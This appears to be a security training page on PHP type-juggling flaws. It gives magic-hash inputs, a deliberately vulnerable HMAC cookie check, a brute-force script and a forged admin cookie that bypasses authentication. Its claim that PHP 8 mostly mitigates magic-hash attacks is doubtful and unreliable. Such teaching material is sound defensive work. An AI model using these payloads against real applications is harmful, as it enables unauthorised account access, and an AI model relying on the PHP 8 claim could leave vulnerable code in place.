---
layout: training-page
title: "Type Juggling — Red Team Academy"
module: "Web Hacking"
tags:
  - type-juggling
  - php
  - loose-comparison
  - magic-hashes
  - authentication-bypass
page_key: "web-type-juggling"
render_with_liquid: false
---

# Type Juggling

PHP is a loosely-typed language that automatically converts variables between types based on context.
  Type juggling vulnerabilities arise when loose comparison operators (`==`, `!=`)
  are used instead of strict operators (`===`, `!==`), and an attacker controls
  one of the compared values. The result is that PHP may evaluate two very different values as equal,
  leading to authentication and authorization bypasses.

Similar loose-comparison issues exist in MySQL, MariaDB, NodeJS, Perl, Python, SQLite, and Postgres.

## Loose vs Strict Comparison

- **Loose** (`==`, `!=`): checks that both variables have the same *value* after type coercion.
- **Strict** (`===`, `!==`): checks that both variables have the same *type* AND the same value.

## True Statements (Loose Comparison Quirks)

The following expressions evaluate to `true` in PHP with loose comparison:

```
'0010e2'   == '1e3'           // true  (both treated as scientific notation: 1000)
'123'      == 123             // true  (string coerced to int)
'123a'     == 123             // true  (string with leading digits)
'abc'      == 0               // true  (non-numeric string == 0 in PHP 7; fixed in PHP 8)
''         == 0               // true
0          == false           // true
false      == NULL            // true
NULL       == ''              // true

// PHP 5 only (hex string comparison):
'0xABCdef' == ' 0xABCdef'    // true  (PHP 5.0) / false (PHP 7.0+)
'0x01'     == 1              // true  (PHP 5.0) / false (PHP 7.0+)
```

### NULL Returns from Hash Functions

```
<?php
var_dump(sha1([]));   // NULL — array passed to sha1
var_dump(md5([]));    // NULL — array passed to md5
// NULL == false == 0 == "" under loose comparison
?>
```

## Magic Hashes

A "magic hash" is a hash digest that starts with `0e` followed entirely by digits.
  PHP's loose comparison treats strings in scientific notation as floats, so any two hashes
  beginning with `0e[digits]` compare as equal — they both equal `0`.

If a login compares a stored password hash to a user-supplied hash with `==`, supplying
  a known magic-hash input bypasses authentication when the stored hash also starts with `0e`.

### Known Magic Hash Inputs

```
// MD5 magic hashes
240610708       → 0e462097431906509019562988736854
QNKCDZO         → 0e830400451993494058024219903391
0e1137126905    → 0e291659922323405260514745084877
0e215962017     → 0e291242476940776845150308577824

// SHA1 magic hashes
10932435112     → 0e07766915004133176347055865026311692244

// SHA-256 magic hashes
34250003024812  → 0e46289032038065916139621039085883773413820991920706299695051332
TyNOQHUS        → 0e66298694359207596086558843543959518835691168370379069085300385
```

```
<?php
// These all evaluate to true under loose comparison:
var_dump(md5('240610708') == md5('QNKCDZO'));  // bool(true)
var_dump(md5('aabg7XSs')  == md5('aabC9RqS')); // bool(true)
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY')); // bool(true)
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m')); // bool(true)
?>
```

## Exploiting HMAC Validation (Full Example)

The following vulnerable code uses loose comparison to validate a cookie HMAC:

```
<?php
function validate_cookie($cookie, $key) {
    $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
    if ($cookie['hmac'] != $hash) { // VULNERABLE: loose comparison
        return false;
    } else {
        echo "Access granted";
    }
}
?>
```

The attack: set `hmac = "0"` in the cookie. If the computed HMAC starts with
  `0e` followed only by digits, PHP sees `"0" == 0e... == 0` and grants access.

### Step 1 — Brute-force a magic expiration value

```
<?php
// docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
for ($i = 1424869663; $i < 1835970773; $i++) {
    $out = hash_hmac('md5', 'admin|' . $i, '');
    if (str_starts_with($out, '0e')) {
        if ($out == 0) {
            echo "$i - " . $out;
            break;
        }
    }
}
?>
// Output: 1539805986 - 0e772967136366835494939987377058
```

### Step 2 — Craft the forged cookie

```
<?php
$cookie = [
    'username'   => 'admin',
    'expiration' => 1539805986,  // bruteforced value
    'hmac'       => '0'          // loose-compares equal to 0e... hash
];
?>
```

## PHP 8 Notes

PHP 8 introduces Saner String to Number Comparisons: strings are no longer automatically cast to
  integers when compared with `==` against numbers. The `'abc' == 0` quirk
  is resolved. Magic hash attacks on `0e` patterns are also mitigated in PHP 8 for most
  scenarios. For older applications still running PHP 5 or PHP 7, all of the above remain exploitable.

## Resources

- PayloadsAllTheThings Type Juggling — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling`
- PHP Magic Tricks: Type Juggling (OWASP) — Chris Smith
- Magic Hashes — Robert Hansen, WhiteHat Security
- spaze/hashes — collection of magic hash strings — `github.com/spaze/hashes`
- Loose-Compare-Tables (multi-language) — `github.com/Hakumarachi/Loose-Compare-Tables`
- Root Me PHP Type Juggling challenge — `root-me.org/en/Challenges/Web-Server/PHP-type-juggling`
